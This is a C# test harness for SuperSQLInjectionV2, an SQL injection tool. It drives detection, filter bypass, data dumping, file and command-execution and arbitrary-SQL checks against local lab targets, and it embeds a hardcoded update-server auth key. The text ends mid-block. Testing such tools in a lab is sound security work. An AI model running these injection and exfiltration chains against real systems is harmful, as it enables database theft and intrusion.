using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Bypass;
using SuperSQLInjectionV2.Msg;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.Tools.Inject;
using SuperSQLInjectionV2.ViewModels;
using SuperSQLInjectionV2.ViewModels.Tools;
using CommunityToolkit.Mvvm.Messaging;

// SuperSQLInjectionV2 全流程验证 harness：
// 用法: TestHarness [db1,db2,...] [level] [risk]
//   db: mysql | pgsql | sqlserver | sqlite（默认前三者）
// 对 TestWebApp（127.0.0.1:{twaPort}）的 /num 数字型注入点执行：注入检测 -> 应用最优注入点 -> 利用取数验证

LogTools.Headless = true;
System.Text.Encoding.RegisterProvider(System.Text.CodePagesEncodingProvider.Instance);
Console.OutputEncoding = System.Text.Encoding.UTF8;

string[] dbs = args.Length > 0 && !string.IsNullOrWhiteSpace(args[0])
    ? args[0].Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
    : ["mysql", "pgsql", "sqlserver"];
int level = args.Length > 1 && int.TryParse(args[1], out var l) ? l : 1;
int risk = args.Length > 2 && int.TryParse(args[2], out var r) ? r : 1;

var report = new List<string>();

Console.WriteLine($"===== SuperSQLInjectionV2 多库注入检测与利用链路验证（Level={level}, Risk={risk}）=====");

if (args.Length > 0 && args[0] == "probe")
{
    Probe(args.Length > 1 ? args[1] : "mysql");
    return;
}

if (args.Length > 0 && args[0] == "tamper")
{
    TamperTest();
    return;
}

if (args.Length > 0 && args[0] == "payload")
{
    PayloadMgrTest();
    return;
}

if (args.Length > 0 && args[0] == "ua")
{
    UaPoolTest();
    return;
}

if (args.Length > 0 && args[0] == "eval")
{
    await EvalHookTest();
    return;
}

if (args.Length > 0 && args[0] == "xshd")
{
    XshdTest();
    return;
}

if (args.Length > 0 && args[0] == "xshdsnap")
{
    XshdSnapshot.Run();
    return;
}

if (args.Length > 0 && args[0] == "xshdprobe")
{
    XshdProbe.Run();
    return;
}

if (args.Length > 0 && args[0] == "guiflow")
{
    await GuiFlowTest.Run();
    return;
}

if (args.Length > 0 && args[0] == "tamperlib")
{
    TamperLibTest();
    return;
}

if (args.Length > 0 && args[0] == "session")
{
    SessionTest();
    return;
}

if (args.Length > 0 && args[0] == "dumpresume")
{
    DumpResumeTest();
    return;
}

if (args.Length > 0 && args[0] == "waf")
{
    await WafTest();
    return;
}

if (args.Length > 0 && args[0] == "freq")
{
    FreqTest();
    return;
}

if (args.Length > 0 && args[0] == "csrf")
{
    CsrfTest();
    return;
}

if (args.Length > 0 && args[0] == "hpp")
{
    HppTest();
    return;
}

if (args.Length > 0 && args[0] == "jsonsmoke")
{
    JsonSmoke();
    return;
}

if (args.Length > 0 && args[0] == "dns")
{
    DnsTest();
    return;
}

if (args.Length > 0 && args[0] == "dnsserver")
{
    await DnsServerTest();
    return;
}

if (args.Length > 0 && args[0] == "strip")
{
    StripTest();
    return;
}

if (args.Length > 0 && args[0] == "auth")
{
    AuthTest();
    return;
}

if (args.Length > 0 && args[0] == "feedback")
{
    //关于页反馈链路活体验证：向更新服务提交一条自测反馈
    using var mgr = new SuperSQLInjectionV2.Tools.Update.UpdateManager(new SuperSQLInjectionV2.Tools.Update.UpdateManagerOptions
    {
        ServerUrl = "http://soft.shack2.cn/",
        AppId = "supersqlinjection",
        ClientAuthKey = "13672d9ae9cd29b9972c0ebcee559f3cb06299434f406eefea9e5d75e6684666"
    });
    await mgr.SubmitFeedbackAsync("【自测】关于页反馈链路验证（TestHarness 提交），可忽略。", null, "2.0.0");
    Console.WriteLine("FEEDBACK_OK");
    return;
}

if (args.Length > 0 && args[0] == "poolq")
{
    //连接池信号量队列化验证：槽位满时排队（不再新建-丢弃），释放后可租
    int poolPass = 0, poolFail = 0;
    void PoolCheck(string name, bool ok)
    {
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name}");
        if (ok) poolPass++; else poolFail++;
    }
    SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.MaxPerKey = 2;
    string key = "pooltest:80:False";
    //占满 2 个槽位（栈空返回 null=需新建）
    var c1 = await SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.RentAsync(key, CancellationToken.None);
    var c2 = await SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.RentAsync(key, CancellationToken.None);
    PoolCheck("空池租借返回null（调用方新建）", c1 == null && c2 == null);
    //第 3 个租借应排队：300ms 超时取消
    bool queued = false;
    try
    {
        using var cts = new CancellationTokenSource(300);
        await SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.RentAsync(key, cts.Token);
    }
    catch (OperationCanceledException) { queued = true; }
    PoolCheck("槽位满时租借排队等待（300ms未获槽位）", queued);
    //释放一个槽位后可立即租到
    SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.ReleaseSlot(key);
    bool rented = false;
    try
    {
        using var cts2 = new CancellationTokenSource(2000);
        var c3 = await SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.RentAsync(key, cts2.Token);
        rented = true; //拿到槽位（栈空仍返回null，但不阻塞）
    }
    catch (OperationCanceledException) { }
    PoolCheck("释放槽位后立即可租", rented);
    SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.ReleaseSlot(key);
    SuperSQLInjectionV2.Tools.Http.HttpConnectionPool.ReleaseSlot(key);
    Console.WriteLine($"===== pool结果: PASS={poolPass} FAIL={poolFail} =====");
    return;
}

if (args.Length > 0 && args[0] == "errfp")
{
    //报错指纹双链路验证：fork 精化 + 驱动级字面召回 + errors.xml 独有库
    int fpPass = 0, fpFail = 0;
    void FpCheck(string name, string body, string expectFirst)
    {
        var hits = SuperSQLInjectionV2.Tools.InjectTools.ScanDbByError(body);
        bool ok = hits.Count > 0 && hits[0] == expectFirst;
        Console.WriteLine($"[{(ok ? "PASS" : "FAIL")}] {name} → [{string.Join(",", hits)}]（期望首项 {expectFirst}）");
        if (ok) fpPass++; else fpFail++;
    }
    //MariaDB fork：errors.xml fork 名应排在手工 MySQL 命中之前
    FpCheck("MariaDB fork优先", "ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version", "MariaDB");
    //DB2 驱动级报错：errors.xml 未覆盖 SQLCODE=- 单独出现，手工指纹补召回
    FpCheck("DB2 驱动级召回", "com.ibm.db2.jcc.am.SqlSyntaxErrorException: DB2 SQL Error: SQLCODE=-104, SQLSTATE=42601", "IBM DB2");
    FpCheck("DB2 纯SQLCODE召回", "DB2 SQL Error: SQLCODE=-206, SQLSTATE=42703, SQLERRMC=ID", "IBM DB2");
    //sqlite 字面相容
    FpCheck("SQLite 字面", "[SQLITE_ERROR] SQL error or missing database near \"x\"", "SQLite");
    //MySQL 普通语法错误（手工与 errors.xml 都覆盖）
    FpCheck("MySQL 通用", "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near", "MySQL");
    Console.WriteLine($"===== errfp结果: PASS={fpPass} FAIL={fpFail} =====");
    return;
}

if (args.Length > 0 && args[0] == "uri")
{
    UriTest();
    return;
}

if (args.Length > 0 && args[0] == "searchsql")
{
    SearchSqlTest();
    return;
}

if (args.Length > 0 && args[0] == "xml")
{
    XmlTest();
    return;
}

if (args.Length > 0 && args[0] == "dumpfilter")
{
    DumpFilterTest();
    return;
}

if (args.Length > 0 && args[0] == "smart")
{
    SmartTestAsync().Wait();
    return;
}

if (args.Length > 0 && args[0] == "protocol")
{
    await ProtocolTest();
    return;
}

if (args.Length > 0 && args[0] == "unionbatch")
{
    await UnionBatchTest();
    return;
}

if (args.Length > 0 && args[0] == "hitcount")
{
    await HitCountTest();
    return;
}

if (args.Length > 0 && args[0] == "tampercfg")
{
    //统一编码工具配置序列化往返探针（tamper/编码处理合并后：EncodeTools）
    var bp = new SuperSQLInjectionV2.Models.ByPassConfig();
    bp.EncodeTools.Add(new SuperSQLInjectionV2.Models.EncodeToolModel { Name = "testjs", Builtin = false, Code = "function tamper(p){return p;}", DoCount = 2, Enable = false });
    bp.EncodeTools.Add(new SuperSQLInjectionV2.Models.EncodeToolModel { Name = "空格转--注释", Key = "space2dash", Builtin = true, Enable = true });
    string json = System.Text.Json.JsonSerializer.Serialize(bp, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    Console.WriteLine("序列化结果: " + json);
    var back = System.Text.Json.JsonSerializer.Deserialize<SuperSQLInjectionV2.Models.ByPassConfig>(json, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    var item = back?.EncodeTools.Count > 0 ? back.EncodeTools[0] : null;
    var item2 = back?.EncodeTools.Count > 1 ? back.EncodeTools[1] : null;
    Console.WriteLine($"往返后: Name={item?.Name} Builtin={item?.Builtin} CodeLen={item?.Code?.Length ?? -1} DoCount={item?.DoCount} Enable={item?.Enable}");
    Console.WriteLine($"往返后2: Name={item2?.Name} Key={item2?.Key} Builtin={item2?.Builtin} Enable={item2?.Enable}");
    bool cfgOk = item != null && item.Name == "testjs" && (item.Code?.Length ?? 0) > 10 && item.DoCount == 2
        && item2 != null && item2.Builtin && item2.Key == "space2dash";
    Console.WriteLine(cfgOk ? "PASS" : "FAIL(属性丢失)");

    //对照：DataConfig/AppConfig的[ObservableProperty]属性是否同样丢失
    var dc = new SuperSQLInjectionV2.Models.DataConfig();
    dc.DetectLevel = 5;
    string dcJson = System.Text.Json.JsonSerializer.Serialize(dc, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    Console.WriteLine("DataConfig序列化: " + (dcJson.Length > 200 ? dcJson.Substring(0, 200) : dcJson));
    Console.WriteLine("DataConfig.DetectLevel保留: " + (dcJson.Contains("DetectLevel") ? "YES" : "NO(同病)"));
    var ac = new AppConfig();
    ac.Url = "http://probe";
    ac.TimeOut = 33;
    string acJson = System.Text.Json.JsonSerializer.Serialize(ac, SuperSQLInjectionV2.Source.JsonCtx.Compact);
    Console.WriteLine("AppConfig.Url保留: " + (acJson.Contains("http://probe") ? "YES" : "NO(同病)") + " TimeOut保留: " + (acJson.Contains("33") ? "YES" : "NO(同病)"));
    return;
}

if (args.Length > 0 && args[0] == "posscope")
{
    PosScopeTest();
    return;
}

if (args.Length > 0 && args[0] == "pgudf")
{
    PgUdfTestAsync().Wait();
    return;
}

if (args.Length > 0 && args[0] == "priv")
{
    PrivTestAsync().Wait();
    return;
}

if (args.Length > 0 && args[0] == "jumpkey")
{
    JumpkeyTest();
    return;
}

if (args.Length > 0 && args[0] == "vector")
{
    VectorTest();
    return;
}

if (args.Length > 0 && args[0] == "update")
{
    await UpdateLoopTest();
    return;
}

if (args.Length > 0 && args[0] == "vectorlive")
{
    await VectorLiveTest();
    return;
}

if (args.Length > 0 && args[0] == "tpl")
{
    TplTest();
    return;
}

if (args.Length > 0 && args[0] == "errmethod")
{
    ErrorMethodTest();
    return;
}

if (args.Length > 0 && args[0] == "fmt")
{
    FmtTest();
    return;
}

if (args.Length > 0 && args[0] == "log")
{
    LogTest();
    return;
}

if (args.Length > 0 && args[0] == "pool")
{
    await PoolTest();
    return;
}

if (args.Length > 0 && args[0] == "proxytunnel")
{
    await ProxyTunnelTest();
    return;
}

//直连HTTPS冒烟：TestHarness https [url] ——验证SslStream修复后真实TLS握手
if (args.Length > 0 && args[0] == "https")
{
    string url = args.Length > 1 ? args[1] : "https://github.com/";
    var hc = new AppConfig();
    hc.Url = url;
    hc.TimeOut = 10;
    var uri = new Uri(url);
    var hreq = new SuperSQLInjectionV2.Tools.Http.HttpRequest(hc,
        $"GET {uri.PathAndQuery} HTTP/1.1\r\nHost: {uri.Host}\r\nUser-Agent: TestHarness\r\n\r\n");
    var hresp = SuperSQLInjectionV2.Tools.Http.HTTPTool.sendRequestRetry(hreq);
    Console.WriteLine($"HTTPS直连 {url} -> status={hresp.StatusCode} time={hresp.RunTime}ms bodyLen={(hresp.BodyTxt ?? "").Length}");
    Console.WriteLine(hresp.StatusCode > 0 ? "[PASS] HTTPS直连" : "[FAIL] HTTPS直连");
    return;
}

if (args.Length > 0 && args[0] == "fmtrepro")
{
    FmtReproTest();
    return;
}

if (args.Length > 0 && args[0] == "reflect")
{
    ReflectTest();
    return;
}

if (args.Length > 0 && args[0] == "guess")
{
    await GuessTest();
    return;
}

if (args.Length > 0 && args[0] == "upd")
{
    await UpdateFlowTest(args.Length > 1 ? args[1] : "http://127.0.0.1:5900",
        args.Length > 2 ? args[2] : "supersqlinjection",
        args.Length > 3 ? args[3] : "");
    return;
}

foreach (var db in dbs)
{
    Console.WriteLine($"\n########## [{db}] 开始检测 ##########");
    string tag;
    try
    {
        tag = await RunOne(db, level, risk);
    }
    catch (Exception e)
    {
        tag = $"FAIL(异常: {e.Message})";
        Console.WriteLine($"[{db}] 流程异常: {e}");
    }
    report.Add($"[{db}] {tag}");
    Console.WriteLine($"########## [{db}] 结果: {tag} ##########");
}

Console.WriteLine("\n===== 汇总 =====");
foreach (var line in report) Console.WriteLine(line);

static async Task<string> RunOne(string db, int level, int risk)
{
    var config = new AppConfig();
    Log.Sink = new LogTools { NotificationManager = null, TxtLog = null!, AppConfig = config };
    config.Host = "127.0.0.1";
    //H2/HSQLDB走Java靶场（默认5098，SQLI_JAVA_PORT可覆盖——5098被Windows保留段占用时改5298等空闲端口），其余走TestWebApp（5099）
    string targetDb = db.Contains(':') ? db[(db.LastIndexOf(':') + 1)..] : db;
    int javaPort = int.TryParse(Environment.GetEnvironmentVariable("SQLI_JAVA_PORT"), out int jp) ? jp : 5098;
    int targetPort = (targetDb == "h2" || targetDb == "hsqldb") ? javaPort : twaPort;
    config.Port = int.TryParse(Environment.GetEnvironmentVariable("SQLI_TARGET_PORT"), out int dbgPort) ? dbgPort : targetPort;
    config.IsSSL = false;
    config.TimeOut = 15;
    config.DataConfig.DetectLevel = level;
    config.DataConfig.DetectRisk = risk;
    //SQLI_SMART=1 环境变量开启智能模式（验证smart不误伤动态参数检出）
    config.DataConfig.SmartMode = Environment.GetEnvironmentVariable("SQLI_SMART") == "1";
    //SQLI_HEX=1 环境变量开启中文识别（--hex逐字段包装），验证中文取数不乱码
    config.DataConfig.HexDecode = Environment.GetEnvironmentVariable("SQLI_HEX") == "1";

    //注入位置模式：cookie:/json:/ua: 前缀分别对应Cookie键值/JSON体/HTTP头(User-Agent)注入位置
    ParamPlace place = ParamPlace.Query;
    string pname = "id", pvalue = "1", headerName = "";
    string requestTxt;
    if (db.StartsWith("cookie:"))
    {
        place = ParamPlace.Cookie; pname = "track";
        requestTxt =
            $"GET /cookie?db={targetDb} HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            "Accept: */*\r\n" +
            "Cookie: track=1; sid=abc123\r\n" +
            "Connection: close\r\n\r\n";
    }
    else if (db.StartsWith("ua:"))
    {
        place = ParamPlace.Header; pname = "User-Agent"; pvalue = "TestHarnessUA"; headerName = "User-Agent";
        requestTxt =
            $"GET /ua?db={targetDb} HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: TestHarnessUA\r\n" +
            "Accept: */*\r\n" +
            "Connection: close\r\n\r\n";
    }
    else if (db.StartsWith("json:"))
    {
        place = ParamPlace.BodyJson; pname = "id";
        requestTxt =
            $"POST /json?db={targetDb} HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            "Content-Type: application/json\r\n" +
            "Content-Length: 9\r\n" +
            "Connection: close\r\n\r\n" +
            "{\"id\":1}";
    }
    else if (db.StartsWith("multipart:"))
    {
        place = ParamPlace.BodyMultipart; pname = "id";
        string boundary = "----TestHarnessBoundary7MA4YWxk";
        string mpBody = $"--{boundary}\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n" +
                        $"--{boundary}\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n" +
                        $"--{boundary}--\r\n";
        requestTxt =
            $"POST /multipart?db={targetDb} HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            $"Content-Type: multipart/form-data; boundary={boundary}\r\n" +
            $"Content-Length: {System.Text.Encoding.UTF8.GetByteCount(mpBody)}\r\n" +
            "Connection: close\r\n\r\n" +
            mpBody;
    }
    else if (db.Contains("jvapp:"))
    {
        //JVApp经典JSP靶场 mysql.jsp：数字型注入点，raw参数回显在href里（显示位污染场景复现）
        place = ParamPlace.Query; pname = "id";
        config.Port = int.TryParse(Environment.GetEnvironmentVariable("SQLI_TARGET_PORT"), out dbgPort) ? dbgPort : 8090;
        requestTxt =
            "GET /JVApp/mysql.jsp?id=1 HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            "Accept: */*\r\n" +
            "Connection: close\r\n\r\n";
    }
    else if (db.StartsWith("xml:"))
    {
        //XML/SOAP结构化注入：JVApp(8090) xml.jsp，POST XML体<root><id>元素文本为注入点
        place = ParamPlace.BodyXml; pname = "root/id";
        config.Port = int.TryParse(Environment.GetEnvironmentVariable("SQLI_TARGET_PORT"), out dbgPort) ? dbgPort : 8090;
        string xmlBody = "<root><id>1</id></root>";
        requestTxt =
            "POST /JVApp/xml.jsp HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            "Accept: */*\r\n" +
            "Content-Type: text/xml; charset=utf-8\r\n" +
            $"Content-Length: {System.Text.Encoding.UTF8.GetByteCount(xmlBody)}\r\n" +
            "Connection: close\r\n\r\n" +
            xmlBody;
    }
    else
    {
        //SQLI_TARGET_PATH 可覆盖注入点路径（如 /numt 截断版，验证Union/报错分片取数）
        string path = Environment.GetEnvironmentVariable("SQLI_TARGET_PATH") is { Length: > 0 } p ? p : "/num";
        requestTxt =
            $"GET {path}?db={targetDb}&id=1 HTTP/1.1\r\n" +
            $"Host: 127.0.0.1:{config.Port}\r\n" +
            "User-Agent: SuperSQLInjectionV2-TestHarness\r\n" +
            "Accept: */*\r\n" +
            "Connection: close\r\n\r\n";
    }

    // ---------- 1. 注入检测 ----------
    var sw = System.Diagnostics.Stopwatch.StartNew();
    List<InjectPoint> hits = await InjectDetectEngine.DetectParam(config, requestTxt, pname, pvalue, place, headerName) ?? new List<InjectPoint>();
    sw.Stop();
    Console.WriteLine($"[{db}] 检测耗时 {sw.Elapsed.TotalSeconds:F1}s，命中 {hits.Count} 个注入点：");
    foreach (var h in hits)
    {
        Console.WriteLine($"  - DB={h.DBType}, Type={h.InjectType}, Bool={h.BoolInjectType}, " +
                          $"CheckValue={h.CheckValue}, Cols={h.SumColumnCount}, ShowIdx={h.ShowColumnIndex}, Revers={h.Revers}, Place={h.Place}");
    }
    if (hits.Count == 0) return "FAIL(未检出注入)";

    //检测命中登记通道注册表（同GUI AddInjectRecord）：供取数自动通道升级查询同参数Union/Error记录
    foreach (var h in hits)
    {
        InjectChannelRegistry.Register(config.Host, config.Port, new InjectRecord
        {
            Target = config.Host + ":" + config.Port,
            PName = h.PName ?? pname,
            DBType = h.DBType,
            InjectType = h.InjectType,
            BoolInjectType = h.BoolInjectType,
            CheckValue = h.CheckValue ?? "",
            Revers = h.Revers,
            SumColumnCount = h.SumColumnCount,
            ShowColumnIndex = h.ShowColumnIndex,
            RequestTxt = h.RequestTxt ?? ""
        });
    }

    // ---------- 2. 应用注入点（与 MainViewViewModel.UpdateData 等效） ----------
    // db以"blind:"前缀时强制选择关键字布尔盲注记录，验证盲注逐字符取数链路
    // lowcard: 低基数整值猜测是盲注链路特性，同样强制盲注（hits[^1]恒为Union，不强制会在Union报文上跑盲注读空）
    // ngram: n-gram字符预测权重融合A/B验证，同样强制盲注逐字符链路
    bool forceBlind = db.StartsWith("blind:") || db.StartsWith("cols:") || db.StartsWith("lowcard:") || db.StartsWith("ngram:");
    var best = forceBlind
        ? hits.FirstOrDefault(h => h.InjectType == InjectType.Blind && h.BoolInjectType == BoolInjectType.KeyWord) ?? hits[^1]
        : db.StartsWith("wfilecmd:") || db.StartsWith("full:")
            ? hits.FirstOrDefault(h => h.InjectType == InjectType.Union) ?? hits[^1]
            : hits[^1];
    Console.WriteLine($"[{db}] 应用最优注入点: Type={best.InjectType}, DB={best.DBType}");
    //SQLI_FORCE_TYPE 可强制指定通道（如 Union，验证截断分片等特定链路）
    if (Environment.GetEnvironmentVariable("SQLI_FORCE_TYPE") is { Length: > 0 } ft
        && Enum.TryParse<InjectType>(ft, true, out InjectType ftype)
        && hits.FirstOrDefault(h => h.InjectType == ftype) is { } forced)
    {
        best = forced;
        Console.WriteLine($"[{db}] SQLI_FORCE_TYPE 强制通道: {ftype}");
    }
    config.DataConfig.SelectedInjectType = best.InjectType;
    //注入参数名随注入点应用（同GUI RestoreInjectRecord）：通道自动升级/注册表查询依赖
    config.DataConfig.InjectParamName = best.PName ?? pname;
    if (forceBlind)
    {
        //blind:/cols:/lowcard: 专测盲注逐字符链路（低基数/预测/复核），关闭通道升级避免被路由到Union
        config.DataConfig.ChannelUpgrade = false;
    }
    if (best.InjectType == InjectType.Blind)
    {
        config.DataConfig.SelectBoolInject = best.BoolInjectType;
        config.DataConfig.CheckValue = best.CheckValue;
    }
    //防脏数据校验基线随注入点应用（同GUI RestoreInjectRecord）；SQLI_DIRTY_GUARD=0可关闭校验做A/B对比
    config.DataConfig.TrueCode = best.TrueCode;
    config.DataConfig.FalseCode = best.FalseCode;
    config.DataConfig.SawUnexpectedCode = false;
    if (Environment.GetEnvironmentVariable("SQLI_DIRTY_GUARD") == "0")
    {
        config.DataConfig.DirtyDataGuard = false;
        Console.WriteLine($"[{db}] SQLI_DIRTY_GUARD=0，防脏数据校验已关闭（A/B对比模式）");
    }
    if (Environment.GetEnvironmentVariable("SQLI_PREDICT") == "0")
    {
        config.DataConfig.PredictOutput = false;
        Console.WriteLine($"[{db}] SQLI_PREDICT=0，常见值预测已关闭（A/B对比模式）");
    }
    //SQLI_NGRAM=0 关闭n-gram字符预测权重融合（A/B对比；DataComm内静态读取，此处仅打日志提示）
    if (Environment.GetEnvironmentVariable("SQLI_NGRAM") == "0")
    {
        Console.WriteLine($"[{db}] SQLI_NGRAM=0，n-gram字符预测权重融合已关闭（A/B对比模式）");
    }
    //SQLI_NGRAM_LEARN=0 关闭n-gram在线学习（A/B对比）
    if (Environment.GetEnvironmentVariable("SQLI_NGRAM_LEARN") == "0")
    {
        config.DataConfig.NgramOnlineLearn = false;
        Console.WriteLine($"[{db}] SQLI_NGRAM_LEARN=0，n-gram在线学习已关闭（A/B对比模式）");
    }
    if (Environment.GetEnvironmentVariable("SQLI_UPGRADE") == "0")
    {
        config.DataConfig.ChannelUpgrade = false;
        Console.WriteLine($"[{db}] SQLI_UPGRADE=0，通道自动升级已关闭（A/B对比模式）");
    }
    if (Environment.GetEnvironmentVariable("SQLI_CACHE") == "0")
    {
        config.DataConfig.ValueCache = false;
        Console.WriteLine($"[{db}] SQLI_CACHE=0，跨会话值缓存已关闭（A/B对比模式）");
    }
    //SQLI_CACHE_VERIFY=0 关闭缓存命中后的1次请求新鲜度校验（A/B对比）
    if (Environment.GetEnvironmentVariable("SQLI_CACHE_VERIFY") == "0")
    {
        config.DataConfig.ValueCacheVerify = false;
        Console.WriteLine($"[{db}] SQLI_CACHE_VERIFY=0，值缓存新鲜度校验已关闭（A/B对比模式）");
    }
    var dbType = best.DBType;
    if (dbType == DBType.UnKnow)
    {
        dbType = targetDb switch
        {
            "mysql" => DBType.MySQL,
            "mysqlc" => DBType.MySQL,
            "pgsql" => DBType.PostgreSQL,
            "sqlserver" => DBType.SQLServer,
            "sqlserver08" => DBType.SQLServer,
            "sqlite" => DBType.SQLite,
            "dm" => DBType.DM,
            "kingbase" => DBType.Kingbase,
            "h2" => DBType.H2,
            "hsqldb" => DBType.HSQLDB,
            "opengauss" => DBType.OpenGauss,
            "db2" => DBType.DB2,
            "clickhouse" => DBType.ClickHouse,
            _ => DBType.UnKnow
        };
        Console.WriteLine($"[{db}] 注入点未识别DB类型，按目标回退为 {dbType}");
    }
    config.DataConfig.SelectedDBType = dbType;
    if (best.InjectType == InjectType.Union)
    {
        config.DataConfig.ShowColumnIndex = best.ShowColumnIndex;
        config.DataConfig.SumColumnCount = best.SumColumnCount;
    }
    //TxtRequest为GUI编辑器镜像（TextDocument线程亲和），无UI环境跳过；发包链路只读RequestTxt
    config.RequestTxt = best.RequestTxt;

    //检测期自动适配的编码工具随注入点恢复：同GUI RestoreInjectRecord逻辑，启用对应工具验证取数链路
    if (!string.IsNullOrEmpty(best.AutoTamper))
    {
        var item = config.ByPassConfig.EncodeTools.FirstOrDefault(s =>
            string.Equals(s.Key, best.AutoTamper, StringComparison.OrdinalIgnoreCase)
            || string.Equals(s.Name, best.AutoTamper, StringComparison.OrdinalIgnoreCase));
        if (item == null)
        {
            //统一注册表恢复（EncodeToolRegistry，C#内置实现）
            var found = ScriptTamperEngine.FindBuiltinScript(best.AutoTamper);
            if (found != null)
            {
                item = new EncodeToolModel { Name = found.Name, Key = found.Key, Scope = ScriptScope.Payload, Builtin = true, Enable = false };
                config.ByPassConfig.EncodeTools.Add(item);
            }
        }
        if (item != null)
        {
            item.Enable = true;
            Console.WriteLine($"[{db}] AutoTamper 生效: 启用 {best.AutoTamper}（检测期验证可绕过 '>' 过滤）");
        }
        else
        {
            Console.WriteLine($"[{db}] WARN: AutoTamper={best.AutoTamper} 但内置注册表无此项");
        }
    }

    //SQLI_READMODE 强制盲注读取方式（自动/Ord打包值/Hex编码）
    if (Environment.GetEnvironmentVariable("SQLI_READMODE") is { Length: > 0 } rm)
    {
        config.DataConfig.BlindReadMode = rm;
        Console.WriteLine($"[{db}] SQLI_READMODE 生效: 读取方式={rm}");
    }

    PayloadFactory.Init(dbType);

    string versionExpr = dbType switch
    {
        DBType.MySQL => "version()",
        DBType.PostgreSQL => "version()",
        DBType.SQLServer => "@@version",
        DBType.SQLite => "sqlite_version()",
        DBType.DM => "(select banner from v$version where rownum=1)", // 达梦兼容Oracle：标量子查询取版本
        DBType.Oracle => "(select banner from v$version where rownum=1)",
        DBType.DB2 => "(select rtrim(cast(versionnumber as char(254))) from sysibm.sysversions)",
        DBType.H2 => "h2version()",
        DBType.HSQLDB => "database_version()",
        DBType.ClickHouse => "version()",
        _ => "version()"
    };

    // ---------- 2.45 Windows本地文件/命令验证（wfilecmd: 前缀，本地MySQL用Windows路径） ----------
    if (db.StartsWith("wfilecmd:"))
    {
        return await RunFileCmdWin(config, targetDb, db);
    }

    // ---------- 2.47 全功能矩阵验证（full: 前缀：环境变量/库/表/字段/行数据 × 各检出通道） ----------
    if (db.StartsWith("full:"))
    {
        return await RunFullMatrix(config, targetDb, dbType, hits, db);
    }

    // ---------- 2.5 文件操作与命令执行验证（filecmd: 前缀时执行） ----------
    if (db.StartsWith("filecmd:"))
    {
        return await RunFileCmd(config, targetDb, db);
    }

    // ---------- 2.6 任意SQL执行验证（sql: 前缀时执行，对标业界同类工具 --sql-query） ----------
    if (db.StartsWith("sql:"))
    {
        return await RunUserSqlVerify(config, targetDb, dbType);
    }

    // ---------- 2.63 低基数整值猜测验证（lowcard: 前缀：news.author 低基数列两轮读取，
    // 第一轮逐字符建候选缓存，第二轮应整值等值命中（每格1~3次请求），总请求数应大幅下降） ----------
    if (db.StartsWith("lowcard:"))
    {
        async Task<long> ReadAuthorColumn(int round)
        {
            //SQLI_LOWCARD_ROWS 可指定行号（如 0,2：时间通道只读重复值行缩短耗时）
            int[] rows = Environment.GetEnvironmentVariable("SQLI_LOWCARD_ROWS") is { Length: > 0 } rowsEnv
                ? rowsEnv.Split(',').Select(s => int.Parse(s.Trim())).ToArray()
                : new[] { 0, 1, 2, 3 };
            long before = Interlocked.Read(ref config.RequestTmpCount);
            foreach (int row in rows)
            {
                var dp = new DumpDataParam(new List<string> { "author" }, "sqli_test", "news", row);
                string cellPayload = PayloadFactory.BPTool.DataValue(dp);
                string v = await DataComm.GetStringByBool(config, cellPayload, 4096);
                Console.WriteLine($"[{db}] 第{round}轮 row{row} author={v}");
            }
            return Interlocked.Read(ref config.RequestTmpCount) - before;
        }
        long first = await ReadAuthorColumn(1);
        long second = await ReadAuthorColumn(2);
        Console.WriteLine($"[{db}] 低基数整值猜测：第一轮请求 {first} 次，第二轮请求 {second} 次");
        bool lcOk = second > 0 && second <= 8 && second < first / 4;
        return lcOk ? $"PASS(低基数整值 {first}→{second})" : $"FAIL(低基数整值 {first}→{second})";
    }

    // ---------- 2.62 环境变量/Hash/权限角色链路验证（vers: 前缀：走VersTools.GetVersByUnion → GetUnionData，
    // 验证Union/报错通道截断分片机制对环境变量类取数生效；SQLI_USER_SQL 可构造长数据） ----------
    if (db.StartsWith("vers:"))
    {
        //默认表达式随库种切换（sqlite无version()，用sqlite_version()；sqlserver用@@version）
        string defaultExpr = dbType switch
        {
            DBType.SQLite => "sqlite_version()",
            DBType.SQLServer => "@@version",
            DBType.H2 => "h2version()",
            DBType.HSQLDB => "database_version()",
            _ => "version()"
        };
        string expr = Environment.GetEnvironmentVariable("SQLI_USER_SQL") is { Length: > 0 } us
            ? "(" + us.Trim().TrimEnd(';') + ")" : defaultExpr;
        var vmodel = new VersModel { Name = "vers验证", VerPayload = expr, IsChecked = true };
        SuperSQLInjectionV2.ViewModels.Tools.VersTools.GetVersByEcho(config, new List<VersModel> { vmodel });
        //FireAndForget异步执行，轮询等待结果（最长90s，盲注类通道取长数据较慢）
